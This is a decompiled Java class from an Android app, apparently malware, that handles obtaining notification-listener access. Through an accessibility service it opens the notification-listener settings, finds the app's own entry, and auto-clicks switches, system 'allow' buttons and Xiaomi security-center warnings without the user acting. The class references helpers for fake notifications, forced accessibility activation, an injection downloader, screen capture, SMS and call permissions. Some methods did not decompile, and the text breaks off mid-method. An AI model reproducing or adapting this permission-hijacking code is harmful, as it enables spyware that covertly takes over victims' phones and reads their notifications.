package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.keywords.Regex;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.Timer;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import b4a.example.dateutils;
import com.tillekesoft.accessibilityservices.AccessibilityConstants;
import com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;

/* loaded from: classes.dex */
public class cls_perm_notification extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public boolean _isclassfinished = false;
    public long _lasttimechecked = 0;
    public Timer _timer_checker = null;
    public long _isperm_requestedtime = 0;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public void _complete(boolean z) throws Exception {
    }

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.cls_perm_notification");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", cls_perm_notification.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public boolean _check_if_notis() throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610485772", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }

    public String _class_globals() throws Exception {
        this._isclassfinished = false;
        this._lasttimechecked = 0L;
        this._timer_checker = new Timer();
        this._isperm_requestedtime = 0L;
        return "";
    }

    public String _click_one_switch(List list) throws Exception {
        try {
            new Map();
            int size = list.getSize();
            for (int i = 0; i < size; i++) {
                Map map = new Map();
                java.util.Map map2 = (java.util.Map) list.Get(i);
                java.util.Map map3 = map2;
                Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                    backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/switch_widget");
                    _returner_to_act();
                    return "";
                }
            }
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610223626", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return "";
    }

    /* JADX WARN: Code restructure failed: missing block: B:13:0x003d, code lost:
    
        if (com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.findAndGetFirstSimilar(r28, "android:id/list", true) != null) goto L14;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public java.lang.String _in_case_its_a_list(anywheresoftware.b4a.objects.collections.List r27, java.lang.Object r28) throws java.lang.Exception {
        /*
            Method dump skipped, instructions count: 486
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_notification._in_case_its_a_list(anywheresoftware.b4a.objects.collections.List, java.lang.Object):java.lang.String");
    }

    public boolean _in_case_system_button1_showing(List list) throws Exception {
        int i;
        try {
            new Map();
            int size = list.getSize();
            while (i < size) {
                Map map = new Map();
                java.util.Map map2 = (java.util.Map) list.Get(i);
                java.util.Map map3 = map2;
                Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                i = (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("android:id/button1") || BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("allow_button") || BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("permission_allow_button")) ? 0 : i + 1;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                Map map5 = new Map();
                java.util.Map map6 = (java.util.Map) Common.Null;
                java.util.Map map7 = map6;
                accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                Map map8 = new Map();
                java.util.Map map9 = (java.util.Map) Common.Null;
                java.util.Map map10 = map9;
                accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(true, "com.android.permissioncontroller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9));
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                Map map11 = new Map();
                java.util.Map map12 = (java.util.Map) Common.Null;
                java.util.Map map13 = map12;
                accessibilityEventsListener5.PerformNodeActionOnViewWithArgs(true, "com.android.settings:id/allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map11, map12));
                _returner_to_act();
                return true;
            }
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610354704", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return false;
    }

    public String _incase_device_xiaomi_perm(String str, String str2, List list, Object obj) throws Exception {
        try {
            if (str.toLowerCase().contains("com.miui.securitycenter") && BA.ObjectToString(list).toLowerCase().contains("com.miui.securitycenter:id/intercept_warn_content_end")) {
                new Map();
                int size = list.getSize();
                for (int i = 0; i < size; i++) {
                    Map map = new Map();
                    java.util.Map map2 = (java.util.Map) list.Get(i);
                    java.util.Map map3 = map2;
                    Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                    if (!BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/check_box")) {
                        if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/intercept_warn_allow")) {
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                            Map map5 = new Map();
                            java.util.Map map6 = (java.util.Map) Common.Null;
                            java.util.Map map7 = map6;
                            accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/intercept_warn_allow", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            _returner_to_act();
                            return "";
                        }
                    } else if (1.0d == BA.ObjectToNumber(map4.Get("checked"))) {
                        new Map();
                        int size2 = list.getSize();
                        for (int i2 = 0; i2 < size2; i2++) {
                            Map map8 = new Map();
                            java.util.Map map9 = (java.util.Map) list.Get(i2);
                            java.util.Map map10 = map9;
                            Map map11 = (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9);
                            if (BA.ObjectToString(map11.Get("viewid")).toLowerCase().contains("com.miui.securitycenter:id/intercept_warn_allow")) {
                                Colors colors = Common.Colors;
                                Common.LogImpl("610551308", "clicking by id left top", -16711936);
                                if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map11.Get("Left")), (int) BA.ObjectToNumber(map11.Get("Top")), (int) BA.ObjectToNumber(map11.Get("width")), (int) BA.ObjectToNumber(map11.Get("Height")), "", "com.miui.securitycenter:id/intercept_warn_allow")) {
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                    _returner_to_act();
                                    return "";
                                }
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                                Map map12 = new Map();
                                java.util.Map map13 = (java.util.Map) Common.Null;
                                java.util.Map map14 = map13;
                                accessibilityEventsListener4.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/intercept_warn_allow", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map12, map13));
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                _returner_to_act();
                                return "";
                            }
                        }
                    } else {
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                        AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                        Map map15 = new Map();
                        java.util.Map map16 = (java.util.Map) Common.Null;
                        java.util.Map map17 = map16;
                        accessibilityEventsListener6.PerformNodeActionOnViewWithArgs(true, "com.miui.securitycenter:id/check_box", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map15, map16));
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                        _returner_to_act();
                    }
                }
            }
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610551339", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return "";
    }

    public String _initialize(BA BA) throws Exception {
        innerInitialize(BA);
        return "";
    }

    public boolean _is_perm_requested() throws Exception {
        try {
            new dateutils._period();
            BA activityBA = getActivityBA();
            long j = this._isperm_requestedtime;
            DateTime dateTime = Common.DateTime;
            return dateutils._periodbetween(activityBA, j, DateTime.getNow()).Seconds <= 6;
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610878987", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return true;
        }
    }

    public int _number_of_switches(String str, String str2) throws Exception {
        if (Common.Not(str.contains(str2))) {
            return 0;
        }
        Arrays.fill(new String[0], "");
        Regex regex = Common.Regex;
        return Regex.Split(str2, str).length;
    }

    public void _performaction() throws Exception {
        new ResumableSub_PerformAction(this).resume(this.f268ba, null);
    }

    public static class ResumableSub_PerformAction extends BA.ResumableSub {
        boolean _result1 = false;
        cls_perm_notification parent;

        public ResumableSub_PerformAction(cls_perm_notification cls_perm_notificationVar) {
            this.parent = cls_perm_notificationVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:47:0x00ae  */
        /* JADX WARN: Removed duplicated region for block: B:49:0x00b8 A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r8, java.lang.Object[] r9) throws java.lang.Exception {
            /*
                r7 = this;
            L0:
                int r0 = r7.state     // Catch: java.lang.Exception -> La9
                r1 = 9
                r2 = 7
                r3 = 4
                r4 = 1
                r5 = 10
                r6 = 0
                switch(r0) {
                    case -1: goto La8;
                    case 0: goto La4;
                    case 1: goto L9b;
                    case 2: goto Ld;
                    case 3: goto L7f;
                    case 4: goto L75;
                    case 5: goto Ld;
                    case 6: goto L44;
                    case 7: goto L41;
                    case 8: goto Ld;
                    case 9: goto L21;
                    case 10: goto L1b;
                    case 11: goto Le;
                    default: goto Ld;
                }     // Catch: java.lang.Exception -> La9
            Ld:
                goto L0
            Le:
                r7.state = r3     // Catch: java.lang.Exception -> La9
                r0 = r9[r6]     // Catch: java.lang.Exception -> La9
                java.lang.Boolean r0 = (java.lang.Boolean) r0     // Catch: java.lang.Exception -> La9
                boolean r0 = r0.booleanValue()     // Catch: java.lang.Exception -> La9
                r7._result1 = r0     // Catch: java.lang.Exception -> La9
                goto L0
            L1b:
                r0 = -1
                r7.state = r0     // Catch: java.lang.Exception -> La9
                r7.catchState = r6     // Catch: java.lang.Exception -> La9
                goto L0
            L21:
                r7.state = r5     // Catch: java.lang.Exception -> La9
                r7.catchState = r6     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r0 = r7.parent     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common r0 = r0.__c     // Catch: java.lang.Exception -> La9
                java.lang.String r0 = "610616842"
                com.com.androidrr.cls_perm_notification r1 = r7.parent     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common r1 = r1.__c     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r1 = r7.parent     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.BA r1 = r1.getActivityBA()     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.objects.B4AException r1 = anywheresoftware.b4a.keywords.Common.LastException(r1)     // Catch: java.lang.Exception -> La9
                java.lang.String r1 = anywheresoftware.b4a.BA.ObjectToString(r1)     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common.LogImpl(r0, r1, r6)     // Catch: java.lang.Exception -> La9
                goto L0
            L41:
                r7.state = r5     // Catch: java.lang.Exception -> La9
                goto L0
            L44:
                r7.state = r2     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r0 = r7.parent     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common r0 = r0.__c     // Catch: java.lang.Exception -> La9
                java.lang.String r0 = "610616836"
                java.lang.String r1 = "PerformAction"
                com.com.androidrr.cls_perm_notification r2 = r7.parent     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common r2 = r2.__c     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.constants.Colors r2 = anywheresoftware.b4a.keywords.Common.Colors     // Catch: java.lang.Exception -> La9
                r2 = -16711936(0xffffffffff00ff00, float:-1.7146522E38)
                anywheresoftware.b4a.keywords.Common.LogImpl(r0, r1, r2)     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r0 = r7.parent     // Catch: java.lang.Exception -> La9
                com.com.androidrr.backgroundservice r0 = r0._backgroundservice     // Catch: java.lang.Exception -> La9
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper$AccessibilityEventsListener r0 = com.com.androidrr.backgroundservice._acs     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r1 = r7.parent     // Catch: java.lang.Exception -> La9
                com.com.androidrr.backgroundservice r1 = r1._backgroundservice     // Catch: java.lang.Exception -> La9
                com.tillekesoft.accessibilityservices.AccessibilityConstants r1 = com.com.androidrr.backgroundservice._accservconstants     // Catch: java.lang.Exception -> La9
                r0.PerformGlobalAction(r4)     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r0 = r7.parent     // Catch: java.lang.Exception -> La9
                com.com.androidrr.backgroundservice r0 = r0._backgroundservice     // Catch: java.lang.Exception -> La9
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper$AccessibilityEventsListener r0 = com.com.androidrr.backgroundservice._acs     // Catch: java.lang.Exception -> La9
                r0 = 250(0xfa, float:3.5E-43)
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(r0)     // Catch: java.lang.Exception -> La9
                goto L0
            L75:
                r7.state = r2     // Catch: java.lang.Exception -> La9
                boolean r0 = r7._result1     // Catch: java.lang.Exception -> La9
                if (r0 == 0) goto L0
                r0 = 6
                r7.state = r0     // Catch: java.lang.Exception -> La9
                goto L0
            L7f:
                r7.state = r3     // Catch: java.lang.Exception -> La9
                r7.catchState = r1     // Catch: java.lang.Exception -> La9
                com.com.androidrr.cls_perm_notification r0 = r7.parent     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common r0 = r0.__c     // Catch: java.lang.Exception -> La9
                java.lang.String r0 = "complete"
                com.com.androidrr.cls_perm_notification r1 = r7.parent     // Catch: java.lang.Exception -> La9
                boolean r1 = r1._check_if_notis()     // Catch: java.lang.Exception -> La9
                java.lang.Boolean r1 = java.lang.Boolean.valueOf(r1)     // Catch: java.lang.Exception -> La9
                anywheresoftware.b4a.keywords.Common.WaitFor(r0, r8, r7, r1)     // Catch: java.lang.Exception -> La9
                r0 = 11
                r7.state = r0     // Catch: java.lang.Exception -> La9
                return
            L9b:
                r7.state = r5     // Catch: java.lang.Exception -> La9
                r7.catchState = r1     // Catch: java.lang.Exception -> La9
                r0 = 3
                r7.state = r0     // Catch: java.lang.Exception -> La9
                goto L0
            La4:
                r7.state = r4     // Catch: java.lang.Exception -> La9
                goto L0
            La8:
                return
            La9:
                r0 = move-exception
                int r1 = r7.catchState
                if (r1 == 0) goto Lb7
                int r1 = r7.catchState
                r7.state = r1
                r8.setLastException(r0)
                goto L0
            Lb7:
                goto Lb9
            Lb8:
                throw r0
            Lb9:
                goto Lb8
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_notification.ResumableSub_PerformAction.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public Common.ResumableSubWrapper _real_checker(String str, String str2, List list, Object obj) throws Exception {
        ResumableSub_Real_Checker resumableSub_Real_Checker = new ResumableSub_Real_Checker(this, str, str2, list, obj);
        resumableSub_Real_Checker.resume(this.f268ba, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_Real_Checker);
    }

    public static class ResumableSub_Real_Checker extends BA.ResumableSub {
        int _int_number_of_switches = 0;
        Object _node;
        List _rootinactivewindow;
        String _strevt;
        String _strpkg;
        cls_perm_notification parent;

        public ResumableSub_Real_Checker(cls_perm_notification cls_perm_notificationVar, String str, String str2, List list, Object obj) {
            this.parent = cls_perm_notificationVar;
            this._strpkg = str;
            this._strevt = str2;
            this._rootinactivewindow = list;
            this._node = obj;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            Common common = this.parent.__c;
                            Common.ReturnFromResumableSub(this, null);
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 28;
                            this.catchState = 27;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 27;
                            Common common2 = this.parent.__c;
                            Common common3 = this.parent.__c;
                            Colors colors = Common.Colors;
                            Common.LogImpl("610092546", "Noti ----> Real_Checker ", -65536);
                            break;
                        case 4:
                            this.state = 7;
                            boolean _check_if_notis = this.parent._check_if_notis();
                            Common common4 = this.parent.__c;
                            if (!_check_if_notis) {
                                break;
                            } else {
                                this.state = 6;
                                break;
                            }
                        case 6:
                            this.state = 7;
                            this.parent._returner_to_act();
                            Common common5 = this.parent.__c;
                            Common common6 = this.parent.__c;
                            Common.ReturnFromResumableSub(this, true);
                            return;
                        case 7:
                            this.state = 8;
                            this._int_number_of_switches = 0;
                            this._int_number_of_switches = this.parent._number_of_switches(BA.ObjectToString(this._rootinactivewindow), "switch_widget");
                            this.parent._incase_device_xiaomi_perm(this._strpkg, this._strevt, this._rootinactivewindow, this._node);
                            break;
                        case 8:
                            this.state = 19;
                            int i = this._int_number_of_switches;
                            if (i != 0) {
                                if (i != 1) {
                                    if (i <= 1) {
                                        break;
                                    } else {
                                        this.state = 18;
                                        break;
                                    }
                                } else {
                                    this.state = 16;
                                    break;
                                }
                            } else {
                                this.state = 10;
                                break;
                            }
                        case 10:
                            this.state = 11;
                            break;
                        case 11:
                            this.state = 14;
                            boolean _in_case_system_button1_showing = this.parent._in_case_system_button1_showing(this._rootinactivewindow);
                            Common common7 = this.parent.__c;
                            if (!_in_case_system_button1_showing) {
                                this.state = 13;
                                break;
                            } else {
                                break;
                            }
                        case 13:
                            this.state = 14;
                            this.parent._in_case_its_a_list(this._rootinactivewindow, this._node);
                            break;
                        case 14:
                            this.state = 19;
                            break;
                        case 16:
                            this.state = 19;
                            this.parent._click_one_switch(this._rootinactivewindow);
                            break;
                        case 18:
                            this.state = 19;
                            this.parent._search_click_in_multiple_switches(this._rootinactivewindow);
                            break;
                        case 19:
                            this.state = 20;
                            Common common8 = this.parent.__c;
                            Common.LogImpl("610092584", "Check_If_Notis : " + BA.ObjectToString(Boolean.valueOf(this.parent._check_if_notis())), 0);
                            break;
                        case 20:
                            this.state = 25;
                            boolean _check_if_notis2 = this.parent._check_if_notis();
                            Common common9 = this.parent.__c;
                            if (_check_if_notis2) {
                                this.state = 22;
                                break;
                            } else {
                                this.state = 24;
                                break;
                            }
                        case 22:
                            this.state = 25;
                            Timer timer = this.parent._timer_checker;
                            Common common10 = this.parent.__c;
                            timer.setEnabled(false);
                            cls_perm_notification cls_perm_notificationVar = this.parent;
                            Common common11 = cls_perm_notificationVar.__c;
                            cls_perm_notificationVar._isclassfinished = true;
                            break;
                        case 24:
                            this.state = 25;
                            this.parent._timer_creator();
                            break;
                        case 25:
                            this.state = 28;
                            break;
                        case 27:
                            this.state = 28;
                            this.catchState = 0;
                            Common common12 = this.parent.__c;
                            Common common13 = this.parent.__c;
                            Common.LogImpl("610092601", BA.ObjectToString(Common.LastException(this.parent.getActivityBA())), 0);
                            break;
                        case 28:
                            this.state = -1;
                            this.catchState = 0;
                            Common common14 = this.parent.__c;
                            Common common15 = this.parent.__c;
                            Common.ReturnFromResumableSub(this, false);
                            return;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    BA.setLastException(e);
                }
            }
        }
    }

    public String _request_perm() throws Exception {
        try {
            DateTime dateTime = Common.DateTime;
            this._isperm_requestedtime = DateTime.getNow();
            IntentWrapper intentWrapper = new IntentWrapper();
            intentWrapper.Initialize("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS", "");
            intentWrapper.setFlags(1073741824);
            Common.StartActivity(this.f268ba, intentWrapper.getObject());
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610944520", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return "";
    }

    public String _returner_to_act() throws Exception {
        try {
            Common.LogImpl("610813442", BA.ObjectToString(Boolean.valueOf(_check_if_notis())), 0);
            Colors colors = Common.Colors;
            Common.LogImpl("610813444", "returner_To_Act0000", -16776961);
            if (!_check_if_notis()) {
                return "";
            }
            if (this._timer_checker.IsInitialized()) {
                this._timer_checker.setEnabled(false);
            }
            this._isclassfinished = true;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener2.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610813461", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _search_click_in_multiple_switches(List list) throws Exception {
        int i;
        try {
            new Map();
            int size = list.getSize();
            int i2 = 0;
            boolean z = false;
            while (i2 < size) {
                Map map = new Map();
                java.util.Map map2 = (java.util.Map) list.Get(i2);
                java.util.Map map3 = map2;
                Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
                B4AApplication b4AApplication = Common.Application;
                if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                    z = true;
                }
                if (!z) {
                    i = size;
                } else if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase()) && 0.0d == BA.ObjectToNumber(map4.Get("checked"))) {
                    i = size;
                    if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/switch_widget")) {
                        _returner_to_act();
                        return "";
                    }
                } else {
                    i = size;
                    if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase()) && backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/checkbox")) {
                        _returner_to_act();
                        return "";
                    }
                }
                i2++;
                size = i;
            }
            if (BA.ObjectToString(list).toLowerCase().contains("view all apps")) {
                return "";
            }
            new Map();
            int size2 = list.getSize();
            for (int i3 = 0; i3 < size2; i3++) {
                Map map5 = new Map();
                java.util.Map map6 = (java.util.Map) list.Get(i3);
                java.util.Map map7 = map6;
                Map map8 = (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6);
                String lowerCase2 = BA.ObjectToString(map8.Get("ViewText")).toLowerCase();
                B4AApplication b4AApplication2 = Common.Application;
                if (lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                    int ObjectToNumber = (int) BA.ObjectToNumber(map8.Get("Left"));
                    int ObjectToNumber2 = (int) BA.ObjectToNumber(map8.Get("Top"));
                    int ObjectToNumber3 = (int) BA.ObjectToNumber(map8.Get("width"));
                    int ObjectToNumber4 = (int) BA.ObjectToNumber(map8.Get("Height"));
                    B4AApplication b4AApplication3 = Common.Application;
                    if (accessibilityEventsListener.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName().toLowerCase(), "")) {
                        _returner_to_act();
                        return "";
                    }
                }
            }
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            B4AApplication b4AApplication4 = Common.Application;
            String labelName = B4AApplication.getLabelName();
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            Map map9 = new Map();
            java.util.Map map10 = (java.util.Map) Common.Null;
            java.util.Map map11 = map10;
            accessibilityEventsListener2.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(map9, map10));
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610289207", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _timer_creator() throws Exception {
        try {
            if (this._timer_checker.IsInitialized()) {
                return "";
            }
            this._timer_checker.Initialize(this.f268ba, "timerChecker", 4000L);
            this._timer_checker.setEnabled(true);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610682375", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _timerchecker_tick() throws Exception {
        try {
            Colors colors = Common.Colors;
            Common.LogImpl("610747906", "Cls_Perm_Notification timerChecker_Tick", -65536);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("610747920", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (this._isclassfinished) {
            this._timer_checker.setEnabled(false);
            return "";
        }
        new dateutils._period();
